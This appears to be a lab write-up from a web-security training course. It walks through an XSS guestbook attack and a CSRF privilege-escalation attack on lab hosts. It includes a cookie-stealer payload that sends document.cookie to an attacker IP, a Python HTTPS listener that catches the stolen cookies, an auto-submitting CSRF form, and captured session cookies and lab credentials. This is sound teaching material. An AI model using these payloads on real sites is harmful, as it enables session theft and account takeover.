# Lab Warmup

After discussing the lab components, let us explore how we can use them to exploit a couple of sample vulnerabilities.

## XSS Warm-Up

Our sample web application is a simple guestbook allowing us to leave entries, which all users can view. An administrator frequently monitors the entries to address spam:

```
https://xss.labintro.htb/view.php
Guestbook entries with a spam notice. Two entries: User htb-stdnt with message Hello World! and options to edit or delete; User admin with a welcome message and options to edit or delete.
```
We can confirm an obvious XSS vulnerability by posting the following entry:

```html
<script>alert(1)</script>
```
```
https://xss.labintro.htb/view.php
Popup alert from xss.labintro.htb displaying the number "1" with an "OK" button.
```
Let us develop an exploit to steal the admin user's cookies. We can use the exploitserver for exploit development by using a payload that loads the script from the exploit server:

```html
<script src="https://exploitserver.htb/exploit"></script>
```
Afterward, we can create a cookie stealer payload like the following on the exploit server. To exfiltrate the cookie, we can use the HTTPS server running on our system:

```js
window.location = "https://10.10.14.144:4443/cookiestealer?c=" + document.cookie;
```
After saving the exploit, we can confirm that it has been saved by accessing the `/exploit` endpoint:

`Request and response details: GET /exploit HTTP/1.1 to host exploitserver.htb; HTTP 200 OK with a script redirecting to https://10.10.14.144:4443/cookiestealer?c= + document.cookie`

Lastly, we must wait for the admin user to access the guestbook. The injected XSS payload causes the admin's browser to load the payload from the exploit server, which will exfiltrate the admin user's cookies to our system:

```bash
kabaneridev@htb[/htb]$ python3 server.py 

10.129.233.62 - - [31/Dec/2024 13:37:36] code 404, message File not found
10.129.233.62 - - [31/Dec/2024 13:37:36] "GET /cookiestealer?c=PHPSESSID=tiitsevk7pns4kmrcmjecm9qq6 HTTP/1.1" 404 
```

## CSRF Warm-Up

The sample web application does not contain much functionality as it is still under construction:

```
https://csrf.labintro.htb/index.php
Welcome message for demo htb-stdnt. Application under construction. Current permissions: user. Option to "Promote."
```
However, we can see that we only have user permissions. There is a promote button. If we press it, the web application informs us that only administrator users can promote other users. However, we can see that the promotion is implemented with the following request:

`Request to GET /profile.php?promote=htb-stdnt on csrf.labintro.htb with a PHPSESSID cookie. Response includes an error message: "Only administrators can promote users."`

In particular, this endpoint has no CSRF protection, enabling us to execute a CSRF attack to make an administrator promote our user. To do so, we need to create an HTML form that corresponds to the promotion request:

```html
<html>
  <body>
    <form method="GET" action="https://csrf.labintro.htb/profile.php">
      <input type="hidden" name="promote" value="htb-stdnt" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```
Since we do not want the attack to require additional user interaction, we will add JavaScript code that automatically submits the form once the page is loaded:

```html
<script>
	document.forms[0].submit();
</script>
```
Combining these two parts results in the following payload, which we will save in the exploitserver:

```html
<html>
  <body>
    <form method="GET" action="https://csrf.labintro.htb/profile.php">
      <input type="hidden" name="promote" value="htb-stdnt" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```
We can test our exploit by clicking on View Exploit while being logged in to the vulnerable application. This results in a request to `https://exploitserver.htb/exploit`, which returns our saved payload. The payload auto-submits the form, creating a cross-origin request to the vulnerable web application. However, since we are not an administrator, the promotion fails:

```
https://csrf.labintro.htb/profile.php?promote=htb-stdnt
Welcome message for demo htb-stdnt. Application under construction. Current permissions: user. Option to "Promote." Error message: "Only administrators can promote users."
```
However, this confirms that our CSRF payload successfully sent the HTTP request to promote our user. To execute the attack, we can deliver our payload to the victim and select the current vHost `csrf.labintro.htb`. This will result in the victim accessing `https://exploitserver.htb/exploit`. After waiting for a few seconds and refreshing the page, we are promoted to admin:

```
https://csrf.labintro.htb/profile.php
Welcome message for demo htb-stdnt. Application under construction. Current permissions: administrator. Option to "Promote."
```
Thus, we successfully exploited the CSRF vulnerability to make the administrator victim promote our user.

Note: When working on the labs, please keep the following things in mind:

*   There is a simulated victim user in all labs in this module. This victim user may take some time to access the payload. So, make sure your payload works by testing it yourself, and please be patient and wait a couple of minutes for the victim to trigger the exploit.
*   The simulated victim uses a Chromium 114.0.5735.90 Browser. The exploits have been tested on this browser version. Due to many recent changes regarding the handling of third-party cookies, it cannot be guaranteed that the exploits will work on later browser versions. You can download older Chromium releases here.
*   Please delete all cookies when moving from one lab to the next. The existence of cookies from previous labs may cause the browser to reject cookies in future labs.

## Lab Warmup Questions

**Question 1: Familiarize yourself with the lab environment. Use the components to exploit the XSS vulnerability to steal the victim's cookie.**

1.  Add the necessary VHosts to your `/etc/hosts` file:
    ```bash
    sudo sh -c 'echo "10.129.233.62 exploitserver.htb xss.labintro.htb csrf.labintro.htb" >> /etc/hosts'
    ```
2.  Navigate to `http://xss.labintro.htb` and log in with the credentials `htb-stdnt:Academy_student!`.
3.  Go to `http://exploitserver.htb` and prepare an XSS payload to steal the victim's session cookie. The payload will redirect to your HTTPS exfiltration server:
    ```js
    window.location = "https://YOUR_IP:YOUR_PORT/cookiestealer?c=" + document.cookie
    ```
4.  Save the payload on the exploit server. It will be viewable at `https://exploitserver.htb/exploit`.
5.  Return to `https://xss.labintro.htb` and submit the following payload as a guestbook entry to load the script from the exploit server:
    ```html
    <script src="https://exploitserver.htb/exploit"></script>
    ```
6.  Create a Python script (`server.py`) for the HTTPS exfiltration server:
    ```python
    from http import server
    import ssl

    httpd = server.HTTPServer(('0.0.0.0', 4443), server.SimpleHTTPRequestHandler)

    # New API for Python 3.10+
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile='./server.pem')

    httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
    httpd.serve_forever()
    ```
7.  Generate a self-signed certificate using `openssl`:
    ```bash
    openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
    ```
    (Provide arbitrary details when prompted)
8.  Start the HTTPS Python server:
    ```bash
    python3 server.py
    ```
9.  After a few moments, when the admin user accesses the guestbook, their cookie will be exfiltrated to your HTTPS server.
    ```bash
    10.10.15.52 - - [22/Oct/2025 04:57:01] code 404, message File not found
    10.10.15.52 - - [22/Oct/2025 04:57:01] "GET /cookiestealer?c=PHPSESSID=utn44cn8v3t0pnrlotbaber69o HTTP/1.1" 404 -
    10.10.15.52 - - [22/Oct/2025 04:57:01] code 404, message File not found
    10.10.15.52 - - [22/Oct/2025 04:57:01] "GET /favicon.ico HTTP/1.1" 404 -
    10.129.233.62 - - [22/Oct/2025 04:58:02] code 404, message File not found
    10.129.233.62 - - [22/Oct/2025 04:58:02] "GET /cookiestealer?c=PHPSESSID=t208nrqvq2gq8ehs66uinhkpu2;%20flag=HTB... HTTP/1.1" 404 -
    ```

**Question 2: Use the lab components to exploit the CSRF vulnerability to get your user promoted to administrator.**

1.  Ensure `exploitserver.htb`, `xss.labintro.htb`, and `csrf.labintro.htb` are in your `/etc/hosts` file.
2.  Navigate to `https://csrf.labintro.htb/index.php` and log in with `htb-stdnt:Academy_student!`.
3.  Observe that your current permissions are "user" and there is a "Promote" button.
4.  Intercept the request generated by clicking the "Promote" button (e.g., `GET /profile.php?promote=htb-stdnt`).
5.  Create an HTML form on the `exploitserver.htb` that automatically submits this promotion request:
    ```html
    <html>
      <body>
        <form method="GET" action="https://csrf.labintro.htb/profile.php">
          <input type="hidden" name="promote" value="htb-stdnt" />
          <input type="submit" value="Submit request" />
        </form>
        <script>
          document.forms[0].submit();
        </script>
      </body>
    </html>
    ```
6.  Deliver this payload to the victim by accessing the `/deliver` endpoint on the exploit server, selecting `csrf.labintro.htb` as the target vHost.
7.  Wait a few moments for the simulated victim to trigger the exploit.
8.  Refresh `https://csrf.labintro.htb/profile.php` and confirm that your user has been promoted to "administrator".
